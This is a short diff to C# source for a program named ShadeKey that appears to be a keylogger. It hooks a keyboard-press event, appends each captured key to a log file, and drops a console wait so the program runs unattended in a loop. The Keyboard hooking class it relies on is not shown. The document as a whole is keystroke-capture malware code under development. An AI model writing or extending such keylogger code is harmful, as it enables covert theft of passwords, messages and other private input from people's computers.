@@ -19,18 +19,16 @@ namespace ShadeKey
             keyboard = new Keyboard();
             keyboard.KeyIsPressed += K_KeyIsPressed;
 
-            Console.Read();
-
             while (true) 
             {
                 Thread.Sleep(1000); 
             }
         }
 
-        private static void K_KeyIsPressed(KeyValuePair<byte, string> keyValue)
+        private static void K_KeyIsPressed(string key)
         {
-            logFile.AppendData(keyValue.Value + ",");
-            Console.WriteLine("vk_code {0} : {1}", keyValue.Key, keyValue.Value);
+            logFile.AppendData(key + ",");
+            Console.Write(key);
         }
     }
 }
